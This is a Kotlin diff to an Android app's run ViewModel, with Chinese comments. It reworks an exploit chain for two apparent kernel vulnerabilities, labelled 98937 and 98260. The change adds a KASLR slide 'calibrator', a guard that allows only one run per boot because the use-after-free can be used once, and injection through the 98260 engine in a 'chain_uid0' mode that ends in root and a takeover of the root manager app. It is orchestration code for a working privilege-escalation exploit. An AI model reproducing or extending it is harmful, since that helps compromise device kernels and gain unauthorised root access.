@@ -147,13 +147,20 @@ internal class RunModel(app: Application) : AndroidViewModel(app) {
      * 跑一次链。98260 走自带 payload；98937 目前仍由旧入口承担（下一步迁），
      * 这里先给出明确提示，避免静默什么都不做。
      */
+    private var runSeq = 0
+
     fun start(managerPkg: String?) {
-        if (busy) return
+        if (busy) {
+            log("· 上一次还在执行（busy），忽略这次触发")
+            return
+        }
         // 点「开始提权」才开始记日志（含新建文件），打开软件时不生成
         persistLogs = true
         lastFail = null
         busy = true
         stage = "准备"
+        val rid = ++runSeq
+        log("· run#$rid 触发（busy=false → 开始执行）")
         viewModelScope.launch {
             try {
                 if (managerPkg.isNullOrBlank()) {
@@ -202,82 +209,72 @@ internal class RunModel(app: Application) : AndroidViewModel(app) {
     }
 
     /**
-     * 98937 后端：calibrate-a 拿 slide → calibrate-b 拿 page_offset → exploit → ksu-takeover。
-     * 任何一步失败都把原因写进 lastFail，日志逐行可见。
+     * 98937：只用我们自己的标定器拿 slide，注入仍走 98260 的窗口判据。
+     *
+     * 98937 的注入路径依赖 `mm_page_*` / `kmem_cache_free` 的 enable，那种权限
+     * 在多数机器上拿不到；而它的 perf callchain 通道不需要任何 tracefs 权限，
+     * 所以这里把它降级成「标定器」：slide → EXTRACTKIT_SLIDE → 98260 引擎。
      */
     private suspend fun run98937(managerPkg: String) {
         val app = getApplication<Application>()
-        val release = System.getProperty("os.version").orEmpty()
-        val table = Cve98937Tables.match(app, release)
-        if (table == null) {
-            lastFail = "本机没有 98937 内核表（$release），切回 98260"
-            log("! 没有 98937 内核表：$release")
-            return
-        }
-        log("==== 开始：98937 · ${table.release} ====")
+        log("==== 开始：98937 标定 → 98260 注入 ====")
         log("· 目标管理器：$managerPkg")
 
+        // 同一次开机只能安全跑一次（UAF 是一次性资源；注入成功后还会留下驻留进程 + 僵尸）。
+        // 98260 分支由 ExtractEngine 判；98937 走自己的前置流程，必须自己判一次。
+        val bootId = runCatching {
+            Shell.exec("cat /proc/sys/kernel/random/boot_id 2>/dev/null").second.trim()
+        }.getOrDefault("")
+        val prefs = app.getSharedPreferences("run", android.content.Context.MODE_PRIVATE)
+        val lastOk = prefs.getString("last_ok_boot", null)
+        if (bootId.isNotEmpty() && bootId == lastOk) {
+            log("[guard] 本次开机（boot_id=${bootId.take(8)}）已经成功过一次，拒绝重复执行")
+            busy = false
+            lastFail = "本次开机已经提权成功过一次（同内核实只能跑一次，重启后再试）"
+            return
+        }
+        log("[guard] boot_id=${bootId.take(8).ifEmpty { "?" }} lastOk=${lastOk?.take(8) ?: "无"}")
+
         val allowed = Cve98937.tracefsAllowed(app)
-        log("· tracefs 自检：${if (allowed) "可用" else "受限（可能拿不到真地址）"}")
+        log("· tracefs 自检：${if (allowed) "可用" else "受限（标定走 perf，不依赖它）"}")
 
-        if (!Cve98937.deploy(app, ::log)) {
-            lastFail = "98937 后端部署失败"
-            return
+        stage = "98937 · 事件自检"
+        Cve98937.preflight(app, ::log)
+
+        stage = "98937 · 标定（自有）"
+        val own = Cve98937.calibrateOwn(app, ::log)
+        val slideHex: String?
+        if (own == null) {
+            slideHex = null
+            log("! 自有标定没拿到 slide：回退 98260 自算 base（call_site 通道），注入照跑")
+        } else {
+            slideHex = own.first
+            val pageHex = own.second.ifBlank { "0xffffff7f80000000" }
+            log("✓ 标定：slide=$slideHex page_offset=$pageHex")
         }
 
-        // 1) slide
-        stage = "98937 · 校准 slide"
-        val (okA, outA) = Cve98937.run(app, table, "calibrate-a", ::log)
-        val slideHex = Regex("slide=(0x[0-9a-fA-F]+)").find(outA)?.groupValues?.get(1)
-            ?: Regex("_text=(0x[0-9a-fA-F]+)").find(outA)?.groupValues?.get(1)
-                ?.let { base ->
-                    val text = java.lang.Long.parseUnsignedLong(base.removePrefix("0x"), 16)
-                    val slide = text - java.lang.Long.parseUnsignedLong("ffffffc080000000", 16)
-                    "0x" + java.lang.Long.toHexString(slide)
-                }
-        if (!okA || slideHex == null) {
-            lastFail = "98937 校准 slide 失败"
-            return
+        stage = "98937 · 注入（98260 判据）"
+        val out = withContext(Dispatchers.IO) {
+            engine.run(
+                Modes.byId("chain_uid0"),
+                allowUnmatched = true,
+                onStageUpdate = ::log,
+                managerPkg = managerPkg,
+                safeMode = false,
+                slideHex = slideHex,
+            )
         }
-        log("· slide=$slideHex")
-
-        // 2) page_offset
-        stage = "98937 · 校准 page_offset"
-        val (okB, outB) = Cve98937.run(app, table, "calibrate-b", ::log)
-        val pageHex = Regex("page_offset=(0x[0-9a-fA-F]+)").find(outB)?.groupValues?.get(1)
-            ?: "0xffffff7f80000000"
-        if (!okB) log("! page_offset 没解析出来，用默认 $pageHex")
-
-        // 3) exploit（会 fork 后台 probe，必须 detached 轮询）
-        stage = "98937 · 注入"
-        val params = Cve98937.params(app)
-        val args = params.exploitArgs(slideHex, pageHex)
-        val (okE, outE) = Cve98937.runDetached(
-            app, table, args, ::log,
-            timeoutMs = params.waitSec * 1000L,
-        )
-        if (!okE) {
-            lastFail = if (outE.contains("captured=0")) {
-                "98937 UAF 竞速全丢（captured=0），这台多半锁不住页"
-            } else {
-                "98937 注入未成功"
-            }
-            return
-        }
-
-        // 4) 接管管理器
         val rootedNow = withContext(Dispatchers.IO) { runCatching { engine.hasRootNow() }.getOrDefault(false) }
-        if (!rootedNow) {
-            stage = "98937 · 接管管理器"
-            Cve98937.run(app, table, "ksu-takeover", ::log)
-        }
-        val okRoot = withContext(Dispatchers.IO) { runCatching { engine.hasRootNow() }.getOrDefault(false) }
-        rooted = okRoot
-        if (okRoot) {
-            log("✓ 已提权（98937），打开管理器")
+        rooted = rootedNow
+        if (rootedNow) {
+            log("✓ 已提权（98937 标定 + 98260 注入），打开管理器")
+            if (bootId.isNotEmpty()) {
+                prefs.edit().putString("last_ok_boot", bootId).apply()
+                log("[guard] 记录本次开机已成功（boot_id=${bootId.take(8)}）")
+            }
             openManager = managerPkg
         } else {
-            lastFail = "98937 注入了但没拿到 root（管理器没接管）"
+            lastFail = if (out.ok) "流程走完但没有 root（判据命中却未生效）" else "98260 判据没拿到 uid=0（详见日志）"
             log("! $lastFail")
         }
     }
